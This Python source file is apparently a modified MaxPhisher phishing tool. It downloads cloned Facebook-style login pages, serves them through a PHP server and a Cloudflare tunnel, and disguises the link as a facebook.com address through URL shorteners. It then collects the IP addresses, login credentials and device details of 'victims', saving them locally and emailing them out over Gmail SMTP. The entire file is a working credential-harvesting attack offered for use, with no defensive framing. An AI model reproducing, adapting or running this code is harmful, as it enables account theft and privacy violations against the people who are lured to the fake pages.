from argparse import ArgumentParser
from importlib import import_module as eximport
from glob import glob
from hashlib import sha256
from json import (
    dumps as stringify,
    loads as parse
)
from os import (
    getenv,
    kill,
    listdir,
    mkdir,
    mknod,
    popen,
    remove,
    rename,
    replace,
    system
)
from os.path import (
    abspath,
    basename,
    dirname,
    isdir,
    isfile,
    join
)
from platform import uname
from re import search, sub
from shutil import (
    copy2,
    copyfile,
    copytree,
    get_terminal_size,
    rmtree,
)
from signal import (
    SIGINT,
    SIGKILL,
    SIGTERM
)
from subprocess import (
    DEVNULL,
    PIPE,
    Popen,
    STDOUT,
    call,
    run
)
from smtplib import SMTP_SSL as smtp
from socket import (
    AF_INET as inet,
    SOCK_STREAM as stream,
    setdefaulttimeout,
    socket
)
from sys import (
    argv,
    stdout,
    version_info
)
from tarfile import open as taropen
from time import (
    ctime,
    sleep,
    time
)
from zipfile import ZipFile


# Color snippets
black="\033[0;30m"
red="\033[0;31m"
bred="\033[1;31m"
green="\033[0;32m"
bgreen="\033[1;32m"
yellow="\033[0;33m"
byellow="\033[1;33m"
blue="\033[0;34m"
bblue="\033[1;34m"
purple="\033[0;35m"
bpurple="\033[1;35m"
cyan="\033[0;36m"
bcyan="\033[1;36m"
white="\033[0;37m"
nc="\033[00m"

version="1.1"

# Regular Snippets
ask  =     f"{green}[{white}?{green}] {yellow}"
success = f"{yellow}[{white}√{yellow}] {green}"
error  =    f"{blue}[{white}!{blue}] {red}"
info  =   f"{yellow}[{white}+{yellow}] {cyan}"
info2  =   f"{green}[{white}•{green}] {purple}"


packages = [ "php", "ssh" ]
modules = [ "requests", "bs4", "rich" ]
tunnelers = [ "cloudflared" ]
processes = [ "php", "ssh", "cloudflared" ]
extensions = [ "png", "gif", "webm", "mkv", "mp4", "mp3", "wav", "ogg" ]

try:
    test = popen("cd $HOME && pwd").read()
except:
    exit()

supported_version = 3

if version_info[0] != supported_version:
    print(f"{error}Only Python version {supported_version} is supported!\nYour python version is {version_info[0]}")
    exit(0)

for module in modules:
    try:
        eximport(module)
    except ImportError:
        try:
            print(f"Installing {module}")
            run(f"pip3 install {module}", shell=True)
        except:
            print(f"{module} cannot be installed! Install it manually by {green}'pip3 install {module}'")
            exit(1)
    except:
        exit(1)

for module in modules:
    try:
        eximport(module)
    except:
        print(f"{module} cannot be installed! Install it manually by {green}'pip3 install {module}'")
        exit(1)

from bs4 import BeautifulSoup
from requests import ( 
    get,
    head, 
    Session
) 
from rich.console import Console
from rich.panel import Panel
from rich.progress import (
    BarColumn,
    Progress,
    TextColumn,
    TimeRemainingColumn,
    TransferSpeedColumn
)
from rich.traceback import install as override_default_traceback

override_default_traceback()
cprint = Console().print

# Get Columns of Screen
columns = get_terminal_size().columns

repo_url = "https://github.com/KasRoudra/MaxPhisher"
sites_repo = "https://github.com/KasRoudra2/maxfiles"
websites_url = f"{sites_repo}/archive/main.zip"
repo_branch = "maxfiles-main"

# CF = Cloudflared

home = getenv("HOME")
ssh_dir = f"{home}/.ssh"
sites_dir = f"{home}/.maxsites"
templates_file = f"{sites_dir}/templates.json"
tunneler_dir = f"{home}/.tunneler"
php_file = f"{tunneler_dir}/php.log"
cf_file = f"{tunneler_dir}/cf.log"
site_dir = f"{home}/.site"
cred_file = f"{site_dir}/usernames.txt"
ip_file = f"{site_dir}/ip.txt"
info_file = f"{site_dir}/info.txt"
location_file = f"{site_dir}/location.txt"
log_file = f"{site_dir}/log.txt"
main_ip = "ip.txt"
main_info = "info.txt"
main_cred = "creds.txt"
main_location = "location.txt"
cred_json = "creds.json"
info_json = "info.json"
location_json = "location.json" 
email_file = "files/email.json"
error_file = "error.log"
is_mail_ok = False
redir_url = ""
email = ""
password = ""
receiver = ""
cf_command = f"{tunneler_dir}/cloudflared"
if isdir("/data/data/com.termux/files/home"):
    termux = True
    cf_command = f"termux-chroot {cf_command}"
    saved_file = "/sdcard/.creds.txt"
else:
    termux = False
    saved_file = f"{home}/.creds.txt"

print(f"\n{info}Please wait!{nc}")


default_port = 8080
default_tunneler = "Cloudflared"
default_type = "2"
default_template = "1"


if termux:
    default_dir = "/sdcard/Media"
else:
    default_dir = f"{home}/Media"
if not isdir(default_dir):
   mkdir(default_dir)


port = default_port
region = "auto"
subdomain = None
tunneler = default_tunneler
url = None
directory = default_dir
mode = "normal"
troubleshoot = None
key = False

local_url = f"127.0.0.1:{port}"

ts_commands = {
    "cloudflared": f"{cf_command} tunnel -url {local_url}",
    "cf": f"{cf_command} tunnel -url {local_url}"
}

# My utility functions

# Check if a process is running by 'command -v' command. If it has a output exit_code will be 0 and package is already installed
def is_installed(package):
    exit_code = bgtask(f"command -v {package}").wait() # system(f"command -v {package} > /dev/null 2>&1")
    if exit_code == 0:
        return True
    return False


# Check if a process is running by 'pidof' command. If pidof has a output exit_code will be 0 and process is running
def is_running(process):
    exit_code = bgtask(f"pidof {process}").wait()
    if exit_code == 0:
        return True
    return False


# Check if a json is valid
def is_json(myjson):
  try:
    parse(myjson)
    return True
  except:
    return False


# A simple copy function
def copy(path1, path2):
    if isdir(path1):
        if isdir(path2):
             rmtree(path2)
        copytree(path1, path2)
    if isfile(path1):
        if isdir(path2):
            copy2(path1, path2)

# Delete files/folders if exist
def delete(*paths, recreate=False):
    for path in paths:
        if isdir(path):
            if recreate:
                rmtree(path)
                mkdir(path)
            else:
                rmtree(path)
        if isfile(path): 
            remove(path)


# A poor alternative of GNU/Linux 'cat' command returning file content
def cat(file):
    if isfile(file):
        with open(file, "r") as filedata:
            return filedata.read()
    return ""


# Another poor alternative of GNU/Linux 'sed' command to replace and write
def sed(text1, text2, filename1, filename2=None, occurences=None):
    filedata1 = cat(filename1)
    if filename2 is None:
        filename2 = filename1
    if occurences is None:
        filedata2 = filedata1.replace(text1, text2)
    else:
        filedata2 = filedata1.replace(text1, text2, occurences)
    write(filedata2, filename2)
        
# Another poor alternative of GNU/Linux 'grep' command for regex search
def grep(regex, target):
    if isfile(target):
        content = cat(target)
    else:
        content = target
    results = search(regex, content)
    if results is not None:
        return results.group(1)
    return ""

# Write/Append texts to a file
def write(text, filename):
    with open(filename, "w") as file:
        file.write(str(text)+"\n")

# Write/Append texts to a file
def append(text, filename):
    with open(filename, "a") as file:
        file.write(str(text)+"\n")


# Print lines slowly
def sprint(text, second=0.05):
    for line in text + '\n':
        stdout.write(line)
        stdout.flush()
        sleep(second)
        
# Prints colorful texts
def lolcat(text):
    if is_installed("lolcat"):
        run(["lolcat"], input=text, text=True)
    else:
        print(text)

# Center text 
def center_text(text):
    lines = text.splitlines()
    if len(lines) > 1:
        minlen = min([len(line) for line in lines if len(line)!=0]) + 8
        new_text = ""
        for line in lines:
            padding = columns + len(line) - minlen
            if columns % 2 == 0 and padding % 2 == 0:
                padding += 1
            new_text += line.center(padding) + "\n"
        return new_text
    else:
        return text.center(columns+8)



# Print decorated file content
def show_file_data(file):
    lines = cat(file).splitlines()
    text = ""
    for line in lines:
        text += f"[cyan][[/][green]*[/][cyan]][/][yellow] {line}[/]\n"
    cprint(
        Panel(
            text.strip(),
            title="[bold green]\x4d\x61\x78\x50\x68\x69\x73\x68\x65\x72[/][cyan] Data[/]", 
            title_align="left",
            border_style="blue",
        )
    )

# Generate json file from txt
def text2json(text):
    json = {}
    lines = text.splitlines()
    for line in lines:
        if ":" in line:
            key = line.split(":")[0]
            value = line.split(":")[1]
            for i in line:
                json[key.strip()] = value.strip()
    return json

# Append new entry in array and write in json file
def add_json(json, filename):
    content = cat(filename)
    if is_json(content) or content == "":
        if content == "":
            new_content = []
        if is_json(content):
            new_content = parse(content)
        if isinstance(new_content, list):
            new_content.append(json)
            string = stringify(new_content, indent=2)
            write(string, filename)
            

# Run shell commands in python
def shell(command, capture_output=False):
    try:
        return run(command, shell=True, capture_output=capture_output)
    except Exception as e:
        append(e, error_file)
    # return run(command.split(" "), shell=True)
    # return call(command, shell=True)
    
# Run task in background supressing output by setting stdout and stderr to devnull
def bgtask(command, stdout=PIPE, stderr=DEVNULL, cwd="./"):
    try:
        return Popen(command, shell=True, stdout=stdout, stderr=stderr, cwd=cwd)
    except Exception as e:
        append(e, error_file)


def get_meta(url):
    # Facebook requires some additional header
    if "facebook" in url:
        headers = {
            "upgrade-insecure-requests": "1",
            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.99 Safari/537.36", 
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9", 
            "dnt": "1", 
            "content-type": "application/x-www-form-url-encoded",
            "origin": "https://m.facebook.com",
            "referer": "https://m.facebook.com/", 
            "sec-fetch-site": "same-origin",
            "sec-fetch-mode": "cors", 
            "sec-fetch-user": "empty", 
            "sec-fetch-dest": "document", 
            "sec-ch-ua-platform": "Android",
            "accept-encoding": "gzip, deflate br", 
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8"
        }
    else:
        headers = {
            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.99 Safari/537.36", 
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9", 
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8"
        }
    allmeta = ""
    try:
        response = get(url, headers=headers).text
        soup = BeautifulSoup(response, "html.parser")
        metas = soup.find_all("meta")
        if metas is not None and metas!=[]:
            allmeta = "\n".join([str(meta) for meta in metas])
    except Exception as e:
        append(e, error_file)
    return allmeta
    
# Replace the default ugly exception message
def exception_handler(e):
    lines_arr = []
    tb = e.__traceback__
    while tb is not None:
        if tb.tb_frame.f_code.co_filename == abspath(__file__):
            lines_arr.append(str(tb.tb_lineno))
        tb = tb.tb_next
    name = type(e).__name__
    append(e, error_file)
    if ":" in str(e):
        message = str(e).split(":")[0]
    elif "(" in str(e):
        message = str(e).split("(")[0]
    else:
        message = str(e)
    line_no = lines_arr[len(lines_arr) - 1]
    lines_no = ", ".join(lines_arr)
    print(f"{error}{name}: {message} at lines {lines_no}")
    
# Website chooser
def show_options(sites, is_main=True, is_login=False):
    total_sites = len(sites)
    def optioner(index, max_len):
        # Avoid RangeError/IndexError
        if index >= total_sites:
            return ""
        # Add 0 before single digit number
        new_index = str(index+1) if index >= 9 else "0"+str(index+1) 
        # To fullfill max length of a part we append empty space
        space = " " * (max_len - len(sites[index]))
        return f"{green}[{white}{new_index}{green}] {yellow}{sites[index]}{space}"
    # Array index starts from 0
    first_index = 0
    # Three columns
    one_third = int(total_sites/3)
    # If there is modulus, that means some entries are remaining, we need an extra row
    if total_sites%3 > 0:
        one_third += 1
    options = "\n\n"
    # First index of last line should be less than one-third of total
    while first_index < one_third and total_sites > 10:
        second_index = first_index + one_third
        third_index = second_index + one_third
        options += optioner(first_index, 23) + optioner(second_index, 17) + optioner(third_index, 1) + "\n"
        first_index += 1
    if total_sites < 10:
        for i in range(total_sites):
            options += optioner(i, 20) + "\n"
    options += "\n"
   
    lolcat(options)

# Clear the screen
def clear(fast=False, lol=False):
    shell("clear")
        
        

# Install packages
def installer(package, package_name=None):
    if package_name is None:
        package_name = package
    for pacman in ["pkg", "apt", "apt-get", "apk", "yum", "dnf", "brew", "pacman"]:
        # Check if package manager is present but php isn't present
        if is_installed(pacman):
            if not is_installed(package):
                sprint(f"\n{info}Installing {package}{nc}")
                if pacman=="pacman":
                    shell(f"sudo {pacman} -S {package_name} --noconfirm")
                elif pacman=="apk":
                    if is_installed("sudo"):
                        shell(f"sudo {pacman} add {package_name}")
                    else:
                        shell(f"{pacman} add -y {package_name}")
                elif is_installed("sudo"):
                    shell(f"sudo {pacman} install -y {package_name}")
                else:
                    shell(f"{pacman} install -y {package_name}")
                break
    if is_installed("brew"):
        if not is_installed("cloudflare"):
            shell("brew install cloudflare/cloudflare/cloudflared")


# Process killer
def killer():
    # Previous instances of these should be stopped
    for process in processes:
        if is_running(process):
            # system(f"killall {process}")
            output = shell(f"pidof {process}", True).stdout.decode("utf-8").strip()
            if " " in output:
                for pid in output.split(" "):
                    kill(int(pid), SIGINT)
            elif output != "":
                kill(int(output), SIGINT)
            else:
                print()


# Internet Checker

def internet(url="https://api.github.com", timeout=5):
    while True:
        try:
            head(url=url, timeout=timeout)
            break
        except:
            print(f"\n{error}No internet!{nc}\007")
            sleep(2)
        
# Send mail by smtp library
def send_mail(msg):
    global email, password, receiver
    message = f"From: {email}\nTo: {receiver}\nSubject: \x4d\x61\x78\x50\x68\x69\x73\x68\x65\x72 Login Credentials\n\n{msg}"
    try:
        internet()
        with smtp('smtp.gmail.com', 465) as server:
            server.login(email, password)
            server.sendmail(email, receiver, message) 
    except Exception as e:
        append(e, error_file)
        print(f"{error}{str(e)}")

# Bytes to KB, MB converter
def readable(byte, precision = 2, is_speed = False):
    for unit in ["Bt","KB","MB","GB"]:
        floatbyte = round(byte, precision)
        space = ' ' * (6 - len(str(floatbyte)))
        if byte < 1024.0:
            if is_speed:
                size = f"{floatbyte} {unit}/s{space}"
            else:
                size = f"{floatbyte} {unit}{space}"
            break
        byte /= 1024.0
    return size

# Download files with progress bar
def download(url, path):
    from time import ctime, time
    session = Session()
    filename = basename(path)
    directory = dirname(path)
    retry = 3
    if directory!="" and not isdir(directory):
        mkdir(directory)
    newfile = filename.split(".")[0] if "." in filename else filename
    newname = filename if len(filename) <= 12 else filename[:9]+"..."
    for i in range(retry):
        try:
            print()
            with open(path, "wb") as file:
                response = session.get(url, stream=True, timeout=20)
                total_length = response.headers.get('content-length')
                if total_length is None: # no content length header
                    file.write(response.content)
                else:
                    downloaded = 0
                    total_length = int(total_length)
                    with Progress(
                        TextColumn("[bold blue]{task.fields[filename]}", justify="right"),
                        BarColumn(bar_width=None),
                        "[progress.percentage]{task.percentage:>3.1f}%",
                        "•",
                        TransferSpeedColumn(),
                        "•",
                        TimeRemainingColumn()
                    ) as progress:
                        task = progress.add_task(newfile, total=total_length, filename=newfile.title())
                        for data in response.iter_content(chunk_size=4096):
                            file.write(data)
                            progress.update(task, advance=len(data))
                break
        except Exception as e:
            remove(path)
            append(e, error_file)
            print(f"\n{error}Download failed due to: {str(e)}")
            print(f"\n{info}Retrying {i}/{retry}{nc}")
            sleep(1)
    if not isfile(path):
        print(f"\n{error}Download failed permanently!")
        pexit()


# Extract zip/tar/tgz files
def extract(filename, extract_path='.'):
    directory = dirname(extract_path)
    newfile = filename.split(".")[0] if "." in filename else filename
    if directory!="" and not isdir(directory):
        mkdir(directory)
    print(f"\n{info}Extracting {green}{newfile.title()}{nc}...\n")
    try:
        if ".zip" in filename:
            with ZipFile(filename, 'r') as zip_ref:
                if zip_ref.testzip() is None:
                    zip_ref.extractall(extract_path)
                else:
                    print(f"\n{error}Zip file corrupted!")
                    delete(filename)
                    exit()
            return
        tar = taropen(filename, 'r')
        for item in tar:
            tar.extract(item, extract_path)
            # Recursion if childs are tarfile
            if ".tgz" in item.name or ".tar" in item.name:
                extract(item.name, "./" + item.name[:item.name.rfind('/')])
    except Exception as e:
        append(e, error_file)
        delete(file)
        print(f"{error}{str(e)}")
        exit(1)
        

def get_media():
    media_files = []
    for file in listdir(site_dir):
        extension = file.split(".")[-1]
        if extension in extensions:
            if file=="desc.png" or file=="kk.jpg":
                continue
            media_files.append(f"{site_dir}/{file}")
    return media_files

def write_meta(url):
    if url=="":
        return
    allmeta = get_meta(url)
    if allmeta=="":
        print(f"\n{error}URL isn't correct!")
    write(allmeta, f"{site_dir}/meta.php")


def write_redirect(url):
    global redir_url
    if url == "":
        url = redir_url
    sed("redirectUrl", url, f"{site_dir}/login.php")

# Polite Exit
def pexit():
    killer()
    sprint(f"\n{info2}Thanks for using!\n{nc}")
    exit(0)


def ssh_key():
    if key and not isfile(f"{ssh_dir}/id_rsa"):
        is_no_pass = bgtask(f"ssh-keygen -y -P '' -f {ssh_dir}/id_rsa").wait()
        if is_no_pass != 0:
            pass
            # delete(ssh_dir)
        print(nc)
        shell(f"mkdir -p {ssh_dir} && ssh-keygen -N '' -t rsa -f {ssh_dir}/id_rsa")
    is_known = bgtask("ssh-keygen -F localhost.run").wait()
    if is_known != 0:
        shell(f"ssh-keyscan -H localhost.run >> {ssh_dir}/known_hosts", True)

# Additional configuration for login phishing
def set_login():
    global url
    write_meta("https://www.facebook.com/")
    if url is not None:
        redirect_url = url
    else:
        redirect_url = input(f"\n{ask}{bcyan}Enter redirection url : {green}")
    write_redirect(redirect_url)

# Output urls
def url_manager(url, tunneler):
    global mask
    masked = mask + "@" + url.replace('https://','')
    title = f"[bold cyan]{tunneler}[/]"
    text = f"[blue]URL[/] [green]:[/] [yellow]{url}[/]\n[blue]MaskedURL[/] [green]:[/] [yellow]{masked}[/]"
    cprint(
        Panel(
            text,
            title=title,
            title_align="left",
            border_style="green"
        )
    )
    sleep(0.5)

def shortener1(url):
    website = "https://is.gd/create.php?format=simple&url="+url.strip()
    internet()
    try:
        res = get(website).text
    except Exception as e:
        append(e, error_file)
        res = ""
    shortened = res.split("\n")[0] if "\n" in res else res
    if "https://" not in shortened:
        return ""
    return shortened

def shortener2(url):
    website = "https://api.shrtco.de/v2/shorten?url="+url.strip()
    internet()
    try:
        res = get(website).text
        json_resp = parse(res)
    except Exception as e:
        append(e, error_file)
        json_resp = ""
    if json_resp != "":
        if json_resp["ok"]:
            return json_resp["result"]["full_short_link"]
    return ""

def shortener3(url):
    website = "https://tinyurl.com/api-create.php?url="+url.strip()
    internet()
    try:
        res = get(website).text
    except Exception as e:
        append(e, error_file)
        res = ""
    shortened = res.split("\n")[0] if "\n" in res else res
    if "https://" not in shortened:
        return ""
    return shortened


# Show saved data from saved file with small decoration
def saved():
    clear()
    print(f"\n{info}Saved details: \n{nc}")
    show_file_data(saved_file)
    return

# Optional function for url masking
def masking(url):
    if (shortened:=shortener1(url)) != "":
        pass
    elif (shortened:=shortener2(url)) != "":
        pass
    elif (shortened:=shortener3(url)) != "":
        pass
    else:
        sprint(f"{error}Service not available!")
        waiter()
    short = shortened.replace("https://", "")
    # Remove slash and spaces from inputs
    domain = "facebook.com"
    domain = sub("([/%+&?={} ])", ".", sub("https?://", "", domain))
    domain = "https://"+domain+"-"
    bait = input(f"\n{ask}{bcyan}Enter bait words (use hyphen as space) : {green}")
    if bait=="":
        sprint(f"\n{error}No bait word!")
    else:
        bait = sub("([/%+&?={} ])", "-", bait)+"@"
    final = domain+bait+short
    print()
    #sprint(f"\n{success}Your custom url is > {bcyan}{final}")
    title = "[bold blue]Custom[/]"
    text = f"[cyan]URL[/] [green]:[/] [yellow]{final}[/]"
    cprint(
        Panel(
            text,
            title=title,
            title_align="left",
            border_style="blue",
        )
    )


# Staring functions


# Installing packages and downloading tunnelers
def requirements():
    global termux, cf_command, is_mail_ok, email, password, receiver
    if termux:
        try:
            if not isfile(saved_file):
                mknod(saved_file)
            with open(saved_file) as checkfile:
                data = checkfile.read()
        except:
            shell("termux-setup-storage")
        try:
            if not isfile(saved_file):
                mknod(saved_file)
            with open(saved_file) as checkfile:
                data = checkfile.read()
        except:
            print(f"\n{error}You haven't allowed storage permission for termux. Closing \x50\x79\x50\x68\x69\x73\x68\x65\x72!\n")
            sleep(2)
            pexit()
    internet()
    if termux:
        if not is_installed("proot"):
            sprint(f"\n{info}Installing proot{nc}")
            shell("pkg install proot -y")
    installer("php")
    if is_installed("apt") and not is_installed("pkg"):
        installer("ssh", "openssh-client")
    else:
        installer("ssh", "openssh")
    for package in packages:
        if not is_installed(package):
            sprint(f"{error}{package} cannot be installed. Install it manually!{nc}")
            exit(1)
    killer()
    osinfo = uname()
    platform = osinfo.system.lower()
    architecture = osinfo.machine
    iscloudflared = isfile(f"{tunneler_dir}/cloudflared")
    
    delete("cloudflared.tgz", "cloudflared")
    internet()
    if "linux" in platform:
        if "arm64" in architecture or "aarch64" in architecture:
            if not iscloudflared:
                download("https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64", f"{tunneler_dir}/cloudflared")

        elif "arm" in architecture:
            if not iscloudflared:
                download("https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm", f"{tunneler_dir}/cloudflared")

        elif "x86_64" in architecture or "amd64" in architecture:
            if not iscloudflared:
                download("https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64", f"{tunneler_dir}/cloudflared")

        else:
            if not iscloudflared:
                download("https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386", f"{tunneler_dir}/cloudflared")

    elif "darwin" in platform:
        if "x86_64" in architecture or "amd64" in architecture:
            if not iscloudflared:
                download("https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-darwin-amd64.tgz", "cloudflared.tgz")
                extract("cloudflared.tgz", f"{tunneler_dir}")

        elif "arm64" in architecture or "aarch64" in architecture:
            if not iscloudflared:
                print(f"{error}Device architecture unknown. Download cloudflared manually!")

        else:
            print(f"{error}Device architecture unknown. Download cloudflared manually!")
            sleep(3)
    else:
        print(f"{error}Device not supported!")
        exit(1)
    for tunneler in tunnelers:
        if isfile(f"{tunneler_dir}/{tunneler}"):
            shell(f"chmod +x $HOME/.tunneler/{tunneler}")
    for process in processes:
        if is_running(process):
            print(f"\n{error}Previous {process} still running! Please restart terminal and try again{nc}")
            pexit()
    if is_installed("cloudflared"):
        cf_command = "cloudflared"
    if isfile("websites.zip"):
        delete(sites_dir, recreate=True)
        print(f"\n{info}Copying website files....")
        extract("websites.zip", sites_dir)
        remove("websites.zip")
    if isdir("sites"):
        print(f"\n{info}Copying website files....")
        copy("sites", sites_dir)
    if isfile(f"{sites_dir}/version.txt"):
        with open(f"{sites_dir}/version.txt", "r") as sites_file:
            zipver=sites_file.read().strip()
            if float(version) > float(zipver):
                # download(websites_url, "maxsites.zip")
                print(f"\n{info2}Downloading website files....{nc}")
                delete(sites_dir)
                shell(f"git clone {sites_repo} {sites_dir}")
                # shell(f"cd {sites_dir} && git pull")
    else:
        # download(websites_url, "maxsites.zip")
        print(f"\n{info2}Downloading website files....{nc}")
        shell(f"git clone {sites_repo} {sites_dir}")
        # shell(f"cd {sites_dir} && git pull")
    if isfile("maxsites.zip"):
        extract("maxsites.zip", ".tempdir")
        delete("maxsites.zip")
        copy(f".tempdir/{repo_branch}", sites_dir)
        delete(".tempdir")
    if isfile("websites.zip"):
        delete(sites_dir)
        extract("websites.zip", sites_dir)
        remove("websites.zip")
    if mode != "test":
        ssh_key()
    email_config = cat(email_file)
    if is_json(email_config):
        email_json = parse(email_config)
        email = email_json["email"]
        password = email_json["password"]
        receiver = email_json["receiver"]
        # As the server is of gmail, we only allow gmail login
        if "@gmail.com" in email:
            is_mail_ok = True
        else:
            sleep(1)

        
# Main Menu to choose phishing type
def main_menu():
    global mode, troubleshoot
    shell("stty -echoctl") # Skip printing ^C
    requirements()
    if troubleshoot in ts_commands:
        command = ts_commands[troubleshoot]
        shell(command)
        pexit()
    tempdata = cat(templates_file)
    if is_json(tempdata):
        templates = parse(tempdata)
    else:
        sprint(f"\n{error}templates.json file is corrupted!")
        exit(1)
    shell("clear")
    names = list(templates.keys())
    choices = [str(i) for i in range(1,len(names)+1)]
    phishing_type = names[choices.index("1")]
    secondary_menu(templates[phishing_type], phishing_type)
  
# Choose a template
def secondary_menu(sites, name):
    global mode, mask, redir_url
    customdir = None
    otp_folder = ""
    names = [site["name"] for site in sites]
    choices = [str(i) for i in range(1,len(sites)+1)]
    site = sites[0] # Lists start from 0 but our index starts from 1
    folder = site["folder"]
    if "mask" in site:
        mask = site["mask"]
    if "redirect" in site:
        redir_url = site["redirect"]
    site = f"{sites_dir}/{folder}"
    if not isdir(site):
        internet()
        delete("site.zip")
        download(f"https://github.com/KasRoudra/files/raw/main/phishingsites/{folder}.zip", "site.zip")
        extract("site.zip", site)
        remove("site.zip")
    copy(site, site_dir)
    if name == "Login":
        set_login()
    server()

# Start server and tunneling
def server():
    global mode
    clear()
    sprint(f"\n{info2}Initializing PHP server at localhost:{port}....")
    for logfile in [php_file, cf_file]:
        delete(logfile)
        if not isfile(logfile):
            try:
                mknod(logfile)
            except:
                sprint(f"\n{error}Your terminal lacks file/folder permission! Fix it or run me from docker!")
                pexit()
    php_log = open(php_file, "w")
    cf_log = open(cf_file, "w")
    internet()
    bgtask(f"php -S {local_url}", stdout=php_log, stderr=php_log, cwd=site_dir)
    sleep(2)
    try:
        status_code = get(f"http://{local_url}").status_code
    except Exception as e:
        append(e, error_file)
        status_code = 400
    if status_code <= 400:
        sprint(f"\n{info}PHP Server has started successfully!")
    else:
        sprint(f"\n{error}PHP Error! Code: {status_code}")
        pexit()
    sprint(f"\n{info2}Initializing tunnelers at same address.....")
    internet()
    arguments = ""
    if region is not None:
        arguments = f"--region {region}"
    if subdomain is not None:
        arguments = f"{arguments} --subdomain {subdomain}"
    bgtask(f"{cf_command} tunnel -url {local_url}", stdout=cf_log, stderr=cf_log)

    sleep(10)
    cf_success = False
    for i in range(10):
        cf_url = grep("(https://[-0-9a-z.]{4,}.trycloudflare.com)", cf_file)
        if cf_url != "":
            cf_success = True
            break
        sleep(1)

    if cf_success:
        
        sprint(f"\n{info}Your urls are given below : \n")
        if cf_success:
            url_manager(cf_url, "CloudFlared")
        if cf_success and tunneler.lower() in [ "cloudflared", "cf" ]:
            masking(cf_url)
        else:
            print(f"\n{error}URL masking not available for {tunneler}!{nc}")
    else:
        sprint(f"\n{error}Tunneling failed! Use your own tunneling service on port {port}!{nc}")
        if mode == "test":
            exit(1)
    waiter()

# Last function capturing credentials
def waiter():
    global is_mail_ok
    delete(ip_file, cred_file, log_file)
    for file in get_media():
        remove(file)
    sprint(f"\n{info}{blue}Waiting for login info....{cyan}Press {red}Ctrl+C{cyan} to exit")
    try:
        while True:
            if isfile(ip_file):
                print(f"\n\n{success}{bgreen}Victim IP found!\n\007")
                show_file_data(ip_file)
                ipdata = cat(ip_file)
                append(ipdata, main_ip)
                # Just add the ip
                append(ipdata.split("\n")[0], saved_file)
                print(f"\n{info2}Saved in {main_ip}")
                print(f"\n{info}{blue}Waiting for next.....{cyan}Press {red}Ctrl+C{cyan} to exit")
                remove(ip_file)
            if isfile(cred_file):
                print(f"\n\n{success}{bgreen}Victim login info found!\n\007")
                show_file_data(cred_file)
                userdata = cat(cred_file)
                if is_mail_ok:
                    send_mail(userdata)
                append(userdata, main_cred)
                append(userdata, saved_file)
                add_json(text2json(userdata), cred_json)
                print(f"\n{info2}Saved in {main_cred}")
                print(f"\n{info}{blue}Waiting for next.....{cyan}Press {red}Ctrl+C{cyan} to exit")
                remove(cred_file)
            if isfile(info_file):
                print(f"\n\n{success}{bgreen}Victim Info found!\n\007")
                show_file_data(info_file)
                info_data = cat(info_file)
                append(info_data, main_info)
                add_json(text2json(info_data), info_json)
                print(f"\n{info2}Saved in {main_info}")
                print(f"\n{info}{blue}Waiting for next.....{cyan}Press {red}Ctrl+C{cyan} to exit")
                remove(info_file)
            sleep(0.75)
    except KeyboardInterrupt:
        pexit()

if __name__ == '__main__':
    try:
        main_menu()
    except KeyboardInterrupt:
        pexit()
    except Exception as e:
        exception_handler(e)
           
# Modified by Israfil Mia (GitPro10)